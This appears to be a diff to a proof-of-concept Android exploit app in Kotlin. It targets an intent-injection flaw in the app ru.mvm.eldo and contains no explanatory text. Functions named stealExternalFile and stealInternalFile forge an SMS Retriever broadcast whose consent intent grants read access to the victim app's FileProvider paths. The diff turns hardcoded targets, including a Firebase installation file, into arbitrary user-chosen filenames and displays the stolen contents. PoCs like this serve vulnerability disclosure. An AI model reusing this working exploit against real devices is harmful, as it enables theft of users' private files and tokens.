@@ -1,13 +1,15 @@
 package com.example.mvde028_intent_injection_poc
 
+import android.annotation.SuppressLint
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.net.Uri
 import android.os.Bundle
-import android.os.Environment.getExternalStorageDirectory
+import android.provider.Settings
 import android.view.View
+import android.widget.EditText
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.result.contract.ActivityResultContract
@@ -19,23 +21,32 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        intent.data?.let {
+            contentResolver.openInputStream(it)
+        }?.bufferedReader()?.run {
+            readText()
+        }?.also{
+            Toast.makeText(this, it, Toast.LENGTH_LONG).show()
+        }
     }
 
     fun stealExternalFile(view: View) {
-        val extra = Intent().apply {
-            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
-            setClassName(packageName, "com.example.mvde028_intent_injection_poc.LeakActivity")
-            data = Uri.parse("content://ru.mvm.eldo.fileprovider/external_files/Android/data/ru.mvm.eldo/cache/logs/log_1.13.20_0.txt")
-        }.also{
-            sendSmsReceived(it)
+        findViewById<EditText>(R.id.filenameEdit).text.toString().also {
+            sendGrantReadPayload("content://ru.mvm.eldo.fileprovider/external_files/Android/data/ru.mvm.eldo/" + it)
         }
     }
 
     fun stealInternalFile(view: View) {
-        val extra = Intent().apply {
+        findViewById<EditText>(R.id.filenameEdit).text.toString().also {
+            sendGrantReadPayload("content://ru.mvm.eldo.im.threads.fileprovider/internal_files/" + it)
+        }
+    }
+
+    fun sendGrantReadPayload(uri: String) {
+        Intent().apply {
             flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
-            setClassName(packageName, "com.example.mvde028_intent_injection_poc.LeakActivity")
-            data = Uri.parse("content://ru.mvm.eldo.im.threads.fileprovider/internal_files/PersistedInstallation.W0RFRkFVTFRd+MTo4NTMxODEwNzk5OTg6YW5kcm9pZDoyZDcyMWQ2YjNkNTRkNWMyNmJkOWVm.json/")
+            setClassName(packageName, "com.example.mvde028_intent_injection_poc.MainActivity")
+            data = Uri.parse(uri)
         }.also{
             sendSmsReceived(it)
         }
@@ -51,7 +62,7 @@ class MainActivity : ComponentActivity() {
     }
 
     fun writeToFile(view: View) {
-        getFilesDir().absolutePath.also {
+        filesDir.absolutePath.also {
             Toast.makeText(this, it, Toast.LENGTH_LONG).show()
         }
     }
@@ -83,7 +94,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    fun sendSmsReceived(extra: Intent) {
+    private fun sendSmsReceived(extra: Intent) {
         Intent().apply{
             action = SmsRetriever.SMS_RETRIEVED_ACTION
             putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, extra)
@@ -105,20 +116,20 @@ class MainActivity : ComponentActivity() {
         it?.let { sms -> smsListener(sms) }
     }
 
-    fun smsListener(sms: String) : Unit {
+    private fun smsListener(sms: String) {
         Toast.makeText(this, sms, Toast.LENGTH_LONG).show()
     }
 
-    val smsVerificationReceiver = object : BroadcastReceiver() {
+    private val smsVerificationReceiver = object : BroadcastReceiver() {
 
         override fun onReceive(context: Context, intent: Intent) {
             if (SmsRetriever.SMS_RETRIEVED_ACTION == intent.action) {
                 val extras = intent.extras
-                var smsRetrieverStatus = extras?.get(SmsRetriever.EXTRA_STATUS) as Status
+                val smsRetrieverStatus = extras?.get(SmsRetriever.EXTRA_STATUS) as Status
 
                 when (smsRetrieverStatus.statusCode) {
                     CommonStatusCodes.SUCCESS -> smsRequestLauncher.launch(
-                        extras?.getParcelable(SmsRetriever.EXTRA_CONSENT_INTENT)
+                        extras.getParcelable(SmsRetriever.EXTRA_CONSENT_INTENT)
                     )
                 }
             }
@@ -131,5 +142,12 @@ class MainActivity : ComponentActivity() {
 
         override fun parseResult(resultCode: Int, intent: Intent?) =
             intent?.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
+    }
+
+    @SuppressLint("HardwareIds")
+    fun showAndroidId(view: View) {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).also {
+            Toast.makeText(this, it, Toast.LENGTH_LONG).show()
+        }
     }
 }
